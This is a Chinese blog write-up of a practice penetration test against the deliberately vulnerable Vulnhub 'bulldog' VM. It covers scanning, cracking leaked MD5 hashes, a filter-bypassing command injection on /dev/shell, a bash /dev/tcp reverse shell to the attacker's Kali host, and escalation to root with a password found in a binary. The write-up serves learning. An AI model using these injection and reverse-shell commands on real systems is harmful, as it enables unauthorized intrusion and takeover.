### 目录

- - - [前言](https://blog.csdn.net/weixin_42742658/article/details/106463989#_2)

    - [一、bulldog靶机安装](https://blog.csdn.net/weixin_42742658/article/details/106463989#bulldog_12)

    - [二、bulldog靶机渗透](https://blog.csdn.net/weixin_42742658/article/details/106463989#bulldog_51)

    - - [1、信息搜集](https://blog.csdn.net/weixin_42742658/article/details/106463989#1_58)
      - [2、Web渗透--后台登录](https://blog.csdn.net/weixin_42742658/article/details/106463989#2Web_112)
      - [3、Web渗透--命令注入&nc反弹shell](https://blog.csdn.net/weixin_42742658/article/details/106463989#3Webncshell_138)
      - [4、权限提升](https://blog.csdn.net/weixin_42742658/article/details/106463989#4_155)

    - [渗透步骤回顾](https://blog.csdn.net/weixin_42742658/article/details/106463989#_185)

    - [感悟](https://blog.csdn.net/weixin_42742658/article/details/106463989#_207)



### 前言

bulldog靶机的渗透有很多的前辈都做了教程，我这篇也是参考了许多前辈的博客，但是中间还是有很多不懂得地方，官方说有两条路可以拿到root，我只找到了一条。以下内容均是我作为一个菜鸡实操之后的所得，为了留个印子记下来。
 参考博客：
 https://blog.csdn.net/Eastmount/article/details/106066009
 https://blog.csdn.net/qq_38684504/article/details/89706775
 https://www.lagou.com/lgeduarticle/38714.html

------

### 一、bulldog靶机安装

**靶场地址** ：https://www.vulnhub.com/entry/bulldog-1%2C211/

**靶机安装** ：https://download.vulnhub.com/bulldog/

**渗透目标** ：拿到靶机root权限，看到祝贺信息

1、下载靶机bulldog 。
 2、将靶机放到你想存放的地方，然后用VMware–文件–打开–点击导入。
 3、导入的时候可能出现“未通过OVF规范一致性或虚拟硬件合规性检查”，请单击“重试”导入即可。
 4、保证bulldog和kali在同一个局域网内（这里方法有很多），我采用的是bulldog和kali都修改网络适配器为NAT模式（bulldog默认是桥接模式）。
 5、然后点击开启bulldog虚拟机（开启放着就好，不需要其他操作）

**问题**：
 1、bulldog开启的时候为什么没有显示ip地址？
 答：有的博主做的时候显示了ip地址，有的博主没有显示，可能和bulldog的版本有关系，这里不影响渗透，如果没有显示ip，而且通过kali扫描的时候也没有扫描到bulldog主机的ip，那么可能是配置问题，需要设置一下。
 2、kali扫描不到bulldog主机ip该如何设置？
 答：

【1】重新启动bulldog，到开机页面选择第二个Ubuntu的高级选项。
 【2】进入高级选项，再次选择第二个Linux内核版本的恢复模式回车。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601002129836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)

【3】选择root一行回车，进入命令行模式。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601002141213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)

【4】输入 mount -o rw,remount /
 【5】输入 ifconfig -a （查看网卡名称）
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601002211534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)

【6】输入 vim /etc/network/interfaces ，修改网卡名称成【5】步骤查询的结果，保存。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601002235103.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)

【7】输入 reboot 重启。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601002258720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)完成后大概长这样：（我也没有显示ip）
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601002705184.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)

### 二、bulldog靶机渗透

我的设备信息如下：
 物理机：win10
 kali（NAT）：ip 192.168.245.133
 bulldog（NAT）：ip 192.168.245.136

#### 1、信息搜集

**1.1 主机发现**
 得到目标靶机bulldog的ip：192.168.245.136/24

方法一：netdiscover  -i eth0 -r 192.168.245.0/24
 【-i】指定网卡设备
 【-r】指定扫描网段
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601003307830.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)方法二：arp-scan -l
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601003443262.jpg)
 方法三：nmap -sP 192.168.245.0/24 【直接扫描C段】
 【-sP】发现扫描网络存活主机。(直连arp非直连tcp80 icmp)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601003721724.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)
 **1.2 端口扫描**

得到端口，版本，操作系统等信息

【端口扫描】nmap -sS -T4 -A -p- 192.168.245.136
 -sS：半开扫描，记入系统日志风险小
 -sP：扫描端口前，先使用ping扫描，保证主机存活
 -A：全面系统检测，启用脚本检测和扫描

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601004256965.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)发现开放80，8080，23端口

【操作系统扫描】namp -O 192.168.245.136
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601004421195.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)【端口测试】nc -nv 192.168.245.136
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601004748364.jpg)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601004748343.jpg)
 尝试远程连接23端口后失败。

**1.3 目录扫描**
 主机访问192.168.245.136:80

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601005210120.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)方法一：dirb http://192.168.245.136
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601005413170.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)
 方法二：dirsearch.py -u http://192.168.245.136 -e *

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601005501827.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)得到如下目录，然后挨个访问
 http://192.168.245.136/admin/
 http://192.168.245.136/dev/
 http://192.168.245.136/admin/auth/
 http://192.168.245.136/admin/login/
 http://192.168.245.136/admin/logout/
 http://192.168.245.136/dev/shell/

发现admin登录界面需要登录，dev可以访问，但是dev/shell 无法访问

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601010005786.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)尝试万能密码失败
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601010005777.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601010005736.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)dev界面
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601010125965.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)dev界面F12查看器查看，发现疑似哈希密码串
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601010125916.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)dev查看源码，效果和查看器一样
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601010125801.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)dev/shell不能访问
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601010124481.jpg)

#### 2、Web渗透–后台登录

上面发现dev页面隐藏一些疑似哈希的密码串，于是想撞撞哈希值
 撞md5常用网址：
 https://www.cmd5.com/
 https://www.somd5.com/
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601010813459.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)![在这里插入图片描述](https://img-blog.csdnimg.cn/202006010108422.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)
 查询成功但是付费？？？果断换网址
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601010859548.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601011001970.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)所有结果汇总：
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601011028312.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)正好是最后两个，猜测这两个一个是用户名一个是密码然后登录
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601011137166.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)

打脸不要太快

回到dev界面，发现每个邮箱都是XXX@yyyyyyy.com 的格式，前面XXX看着高度可疑，于是用最后两个 nick 和 sarah  以及 bulldog和bulldoglover 两两组合用户名和密码尝试，发现 nick 对应 bulldog，sarah 对应  bulldoglover登录成功！
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601011849876.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601011919761.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)但是，没有一点权限。（那我为啥费劲登上来？？？？）

不过，登录成功之后dev/shell可以访问了
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601012122397.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)
 里面列出的几个命令都是可以操作的
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601012228138.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601012227587.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601012227584.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)

#### 3、Web渗透–命令注入&nc反弹shell

dev/shell页面可以访问，但是只有几个命令，有过滤，下面开始想办法绕过过滤，尝试能不能反弹shell

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601012542826.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)|，&，&&，都可以绕过

这里有大佬想出用echo命令打包的方式绕过，由于我菜，就用他的方法了

**首先**：本地kali用nc监听一个端口，这里随便设置4444端口
 nc -lvp 4444
 **然后**：尝试反弹：bash -i >& /dev/tcp/192.168.245.133/4444 0>&1，报错【中间是kali的ip】
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601013359576.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)
 用echo打包再试：echo ‘bash -i >& /dev/tcp/192.168.245.133/4444 0>&1’|bash
 【echo命令是允许执行的，所以利用echo构建一个反弹shell的命令，然后用管道符给bash执行】

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020060101345055.jpg)此时kali监听接收到反弹过来的shell
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601013702199.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)到这里我们已经进入了系统，但是权限还不是root，离变成root的目标还有距离，下一步就开始提权操作。

#### 4、权限提升

切换成root用户是需要root用户的密码，所以我们这里主要目标是在有限的权限里面搜集到root的密码，然后完成提权。

首先查看/etc/passwd看用户，发现bulldogadmin用户，尝试cd到该目录底下找信息
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601014231292.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)

进入bulldogadmin目录 ls -al 发现隐藏文件 .hiddenadmindirectory，进入并查看

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601014552748.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)

进入.hiddenadmindirectory 发现 customPermissionApp和note两个文件![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601014811931.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)
 cat这两个文件没有发现什么有价值的信息
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601015008360.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601015008365.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)

有大佬说可以利用strings查看可执行文件中的内容，赶紧试试（strings命令用来提取和显示非文本文件中的文本字符串）【受教了受教了】

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601015248346.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)标红的地方是可以之处，
 猜测可能是密码，应为SUPER、 ulitimate、PASSWORD、youCANTget， 可以把他们连到一起正好是SUPERultimatePASSWORDyouCANTget，H是来混淆的，中间刚好有PASSWORD；

然后迫不及待的su -i 挨个试了一遍，发现没有一个对的
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601015519141.jpg)

请教大佬发现，这里有个小技巧，可以用Python调用本地的shell实现，命令如下：
 python -c ‘import pty; pty.spawn("/bin/bash")’
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2020060101580217.jpg)然后在切换root，密码是最长的那个SUPERultimatePASSWORDyouCANTget

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601015847682.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)成功拿到root权限
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601015957232.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)

### 渗透步骤回顾

1、信息收集
 目标IP探测 (arp-scan、netdiscover、nmap)
 Nmap端口扫描，版本，操作系统扫描等
 2、目录扫描
 用dirb扫出了许多关键目录（admin和dev页面）
 用dirsearch扫描出关键目录
 3、敏感文件查找及网页访问
 4、MD5破解（在线破解，多个网址试试）
 仔细观察网页信息，该靶机主要在/dev目录处前端源码泄露了MD5密码信息
 5、登录管理员账号，并在/dev/shell页面利用命令注入漏洞
 6、命令注入和nc反弹shell
 命令拼接（ls &&echo ‘bash -i >& /dev/tcp/192.168.245.133/4444 0>&1’|bash
 nc反弹shell（kali机监听 nc -lvp 4444）
 7、权限提升
 找root权限用户，找敏感目录，文件
 strings的使用
 用Python调用本地的shell实现
 sudo python -c ‘import pty; pty.spawn("/bin/bash")’
 sudo su - root

### 感悟

越学越觉得自己菜，所以只能不断的学下去，这篇博客里面还有一些地方我自己都不大懂，后续会自己先弄明白，忙活了几个月找暑假实习，从内推到网申再到校招，这段时间没怎么写博客，算是偷懒了。不过找实习的过程还是学习了很多，从最开始接到面试电话吓得腿抖，到后面慢慢摸清了面试官的问题套路和面试官有说有笑，自己也算是进步了吧，当然会就是会不会就是不会，和面试官胡搅蛮缠是不行的。也慢慢觉得“自我”这种东西是碰撞出来的，越是碰到强的东西，凶狠的东西，高水准的东西就会反弹回来，虽然撞的鼻青脸肿，但是可以反馈给你自己的水平，让你知道人外有人天外有天，还需夹着尾巴学习，那就夹着尾巴好了，我是一个怀揣大佬梦想的菜鸡，不想当大佬的菜鸡不是好菜鸡！明天就要去上班实习了，实习单位还不错，算是业内一流水平，这会反而睡不着，忙活了这么久，六一节了心情开始忐忑，嗯，希望后面的路我能勇敢的走下去，给自己加加油。

by 久违  2020.6.1 凌晨